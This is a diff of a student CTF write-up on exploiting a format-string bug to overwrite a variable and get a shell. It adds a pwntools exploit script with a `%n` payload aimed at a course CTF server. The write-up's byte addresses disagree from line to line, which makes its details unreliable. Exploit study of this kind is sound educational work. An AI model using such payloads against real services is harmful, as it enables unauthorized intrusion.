@@ -223,8 +223,39 @@ $ echo -e '\x60\xc0\x04\x08%s' | nc ctf-fsi.fe.up.pt 4004
 
 2. Since we want the `key` variable to have the value **0xbeef**, which corresponds to **48879** in decimal, we need to print 48879 characters and then call `%n`.
 
-3. We proceed to construct the string that will serve as the attack. We start by converting the address of the `key` variable to little endian (\x34\xc0\x04\x08\) and then add the remaining number of bytes (48879 - 4 = 48875) to reach the address of the `key` variable. Thus, we have the string `\x20\xb3\x04\x08%48875x%n`.
+3. We set the `Local` variable to `False` and changed the number of the remote to `4005`.
 
-4. However, when we send this input to the program, when it reaches `%48875x`, the stack pointer advances to the next position and no longer points to `0x804c034` (the address of the `key` variable).
+4. We proceed to construct the string that will serve as the attack. We start by converting the address of the `key` variable to little endian (\x34\xc0\x04\x08\) and then add the remaining number of bytes (48879 - 4 = 48875) to reach the address of the `key` variable. Thus, we have the string `\x20\xb3\x04\x08%48875x%n`.
 
-5. To try to solve this problem, we decided to add 8 bytes before the address of the `key` variable so that when the `%x` instruction is executed, the stack pointer points to the address of the `key` variable. This gives us the string `\x20\xb3\x04\x08\x20\xb3\x04\x08%48871x%n`, but when using it we ended up with no success. With this, we couldn't obtain the flag, even when trying with different possible solutions, but we think that this last mentioned try was the one that got us very close to finding the flag.
+5. However, when we send this input to the program, when it reaches `%48875x`, the stack pointer advances to the next position and no longer points to `0x804c034` (the address of the `key` variable).
+
+5. To try to solve this problem, we decided to add 4 bytes before the address of the `key` variable so that when the `%x` instruction is executed, the stack pointer points to the address of the `key` variable. This gives us the string `####\x20\xb3\x04\x08%48871x%n`. When running the script, we obtained the shell so we ran the command `cat flag.txt` to obtain the flag.
+
+![flag]()
+
+
+```py
+from pwn import *
+
+LOCAL = False
+
+if LOCAL:
+    p = process("./program")
+    """
+    O pause() para este script e permite-te usar o gdb para dar attach ao processo
+    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
+    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
+    Depois correr o gdb de forma a dar attach. 
+    (Exemplo: `$ gdb attach 9717` )
+    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
+    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
+    """
+    pause()
+else:    
+    p = remote("ctf-fsi.fe.up.pt", 4005)
+
+p.recvuntil(b"...")
+p.sendline(b"####\x24\xb3\x04\x08%.48871x%n")
+p.interactive()
+``` 
+
